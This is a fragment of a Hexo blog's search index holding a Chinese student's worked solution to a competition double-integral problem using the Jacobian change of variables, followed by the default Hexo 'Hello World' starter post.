两个变量的变换所以我们需要用到<strong>隐函数存在定理3</strong>的Jacobi行列式，下面<p><img src="https://s2.loli.net/2022/10/15/yJCXGEU2qwHfaVD.png" alt="例子.png"> </p><p>【注】设 <img src="https://latex.codecogs.com/svg.image?x=x(u,&space;v),&space;\quad&space;y=y(u,&space;v)" title="https://latex.codecogs.com/svg.image?x=x(u, v), \quad y=y(u, v)" /> ，<strong>雅可比行列式</strong>是:</p><div align=center><img src="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=\left|\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}\right|" title="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=\left|\begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}\right|" /> </div><em>这只是公式，其条件需要读者自寻理解。(ps：我也是小菜鸟)</em><p><img src="https://s2.loli.net/2022/10/15/61EHL8sva3ZlQNu.jpg" alt="1665809444664.jpg"><br><em><center>（给上书本的定义，我也理解理解）</center></em><br>　　这里有个值得注意的是在积分是dxdy代表的是<strong>面积</strong>，所以在变换时需要对<strong>J</strong>加上绝对值,所以原式可以化为下面这样</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_{D1}&space;\frac{u&space;\ln&space;(1&plus;v)}{\sqrt{1-u}}\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|&space;d&space;u&space;d&space;v." title="https://latex.codecogs.com/svg.image?\iint_{D1} \frac{u \ln (1+v)}{\sqrt{1-u}}\left|\frac{\partial(x, y)}{\partial(u, v)}\right| d u d v." /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=||&space;\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}||=|&space;\frac{u}{(1&plus;v)^2}&space;\mid" title="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=|| \begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}||=| \frac{u}{(1+v)^2} \mid" /></div><p>下面来找一找积分区域：<br>　　原来的积分区域:</p><div align=center><img src="https://s2.loli.net/2022/10/15/7r1SyMhCcntuiDP.png" width=""></div>　　则 <img src="https://latex.codecogs.com/svg.image?\color{red}{u&space;=&space;x&space;&plus;&space;y}" title="https://latex.codecogs.com/svg.image?\color{red}{u = x + y}" /> 可以看作u在该可行域内的线性规划，易求得u的范围为（0,1） 而 <img src="https://latex.codecogs.com/svg.image?\color{red}{v&space;=&space;y&space;/&space;x}" title="https://latex.codecogs.com/svg.image?\color{red}{v = y / x}" /> 则可以看作过远点的直线在该区域内可行的斜率，易得角度为(0,pi/2),所以y的范围为(0，+∞)。<div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;\mu&space;\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;u&space;.&space;\\&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;u&space;\stackrel{\sqrt{1-\mu}=t}{=}&space;\int_1^0&space;\frac{\left(1-t^2\right)^2}{t}&space;\cdot(-2&space;t)&space;d&space;t&space;\\&=-2\left(\left.t\right|_1&space;^0-\left.\frac{2}{3}&space;t^3\right|_1&space;^0&plus;\frac{1}{5}\left.t^5\right|_1&space;^0\right)&space;\\&=\frac{16}{15}\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d \mu \int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d u . \\&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d u \stackrel{\sqrt{1-\mu}=t}{=} \int_1^0 \frac{\left(1-t^2\right)^2}{t} \cdot(-2 t) d t \\&=-2\left(\left.t\right|_1 ^0-\left.\frac{2}{3} t^3\right|_1 ^0+\frac{1}{5}\left.t^5\right|_1 ^0\right) \\&=\frac{16}{15}\end{aligned}" /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;v&space;&=\int_0^{&plus;\infty}&space;\ln&space;(1&plus;v)&space;d\left(-\frac{1}{1&plus;v}\right)&space;\\&=\left.-\frac{\ln&space;(1&plus;v)}{1&plus;v}\right|_0&space;^{&plus;\infty}&plus;\int_0^{&plus;\infty}&space;\frac{1}{\left(1&plus;v^2\right)^2}&space;d&space;v&space;\\&=0-\left.\frac{1}{1&plus;v}\right|_0&space;^{&plus;\infty}&space;\\&=1\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d v &=\int_0^{+\infty} \ln (1+v) d\left(-\frac{1}{1+v}\right) \\&=\left.-\frac{\ln (1+v)}{1+v}\right|_0 ^{+\infty}+\int_0^{+\infty} \frac{1}{\left(1+v^2\right)^2} d v \\&=0-\left.\frac{1}{1+v}\right|_0 ^{+\infty} \\&=1\end{aligned}" /></div><p>所以答案为<strong>16&#x2F;15</strong><br>　　下面附上一张参考答案的图：</p><div align=center><img src="https://s2.loli.net/2022/10/15/r6dFzqPkytagxR7.png" width=""></div><p><strong>感谢观看</strong></font></p><p><em>参考文章:</em><br><a href="markdown.com.cn/basic-syntax/">数学背景知识补充——雅可比矩阵 by Tiger</a><br><a href="https://www.bilibili.com/video/BV1oY4y1F7NB/?spm_id_from=333.999.0.0&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">全国大学生数学竞赛历年真题逐题精讲</a><br><a href="https://zhuanlan.zhihu.com/p/421295397">第一届全国大学生数学竞赛预赛试题及解析（非数学类）</a></p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/10/13/hello-world/"/>
      <url>/2022/10/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
